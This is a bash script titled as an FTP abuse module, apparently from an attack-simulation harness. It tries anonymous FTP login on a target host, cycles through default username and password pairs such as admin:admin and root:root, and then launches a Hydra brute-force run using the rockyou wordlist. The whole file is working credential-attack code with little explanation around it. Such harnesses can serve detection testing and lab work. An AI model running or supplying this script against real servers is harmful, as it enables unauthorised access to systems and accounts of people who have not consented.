#!/usr/bin/env bash
# attacks/ftp.sh — FTP abuse module
set -euo pipefail

TARGET="${FTP_TARGET:-${TARGET:-10.10.10.1}}"
PORT="${FTP_PORT:-21}"

echo "[ftp] Starting FTP module → $TARGET:$PORT"

# 1. Anonymous login attempt
echo "[ftp] Anonymous login attempt..."
timeout 5 ftp -n "$TARGET" "$PORT" <<FTP_CMDS 2>/dev/null || true
quote USER anonymous
quote PASS harness@test.local
quit
FTP_CMDS

# 2. Credential stuffing
echo "[ftp] Credential stuffing..."
for creds in "admin:admin" "ftp:ftp" "user:password" "root:root"; do
    u="${creds%%:*}"; p="${creds##*:}"
    timeout 3 ftp -n "$TARGET" "$PORT" <<FTP_CMDS 2>/dev/null || true
quote USER $u
quote PASS $p
quit
FTP_CMDS
done

# 3. Hydra brute force (if available)
if command -v hydra >/dev/null 2>&1; then
    echo "[ftp] Hydra FTP brute force..."
    hydra -l admin -P /usr/share/wordlists/rockyou.txt \
        -t 4 -f "$TARGET" ftp -s "$PORT" >/dev/null 2>&1 || true
fi

echo "[ftp] Module complete."
